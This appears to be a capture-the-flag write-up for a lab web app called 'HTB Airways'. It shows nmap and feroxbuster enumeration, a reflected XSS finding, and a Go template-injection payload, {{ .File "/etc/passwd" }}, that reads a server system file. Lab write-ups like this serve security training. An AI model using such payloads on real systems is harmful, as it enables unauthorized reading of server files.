# Takeoff

<img width="1602" height="286" alt="image" src="https://github.com/user-attachments/assets/0061e55f-ab7e-4e2a-8502-17e92b2336c5" />

---

## port scanning 


```ruby
─$ nmap -sCV -Pn 10.129.86.21    
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-31 21:45 UTC
Nmap scan report for 10.129.86.21
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    nginx
|_http-title: Book a Seat, See the World - HTB Airways Booking
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.86 seconds
                                                                                                                                                                                              
┌──(kali㉿kali)-[~]

```

---


## enumrate the website


<img width="1919" height="802" alt="image" src="https://github.com/user-attachments/assets/0c4df813-28c2-4f3b-904d-7a5dd2cde477" />

```
feroxbuster -u http://10.129.86.21 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

<img width="1744" height="629" alt="image" src="https://github.com/user-attachments/assets/413e4741-9fbc-4c6a-be16-88c531a2b070" />



## i created account and logged in 

<img width="1919" height="758" alt="image" src="https://github.com/user-attachments/assets/86e5c813-4ca7-4374-8967-179fa5aebcfa" />


## i booked tickets and i found that i can add note to tickets 


<img width="1916" height="707" alt="image" src="https://github.com/user-attachments/assets/d96de14e-5314-4b18-9127-6c5b53363bf3" />

> ### notice in response that our app work with **`echo`** go Framework

<img width="1431" height="364" alt="image" src="https://github.com/user-attachments/assets/2b284142-606b-41e7-80d3-8e95ff195f04" />




## i found xss reflect in **`/trips`**

<img width="1902" height="703" alt="image" src="https://github.com/user-attachments/assets/2986c632-720a-439c-918e-46fd6d5e9779" />

## but i think that maybe not useful so i will try other injections maybe will work  

<img width="1753" height="532" alt="image" src="https://github.com/user-attachments/assets/8332ad06-c024-4a8a-9fcf-cbd86834e691" />

##  let's try **`{{ .File "/etc/passwd" }}`**


```
{{ .File "/etc/passwd" }}
```

**` and bingo`**

<img width="1751" height="616" alt="image" src="https://github.com/user-attachments/assets/11c578c4-2fb2-41ad-a2d3-a42b04302ed8" />



























































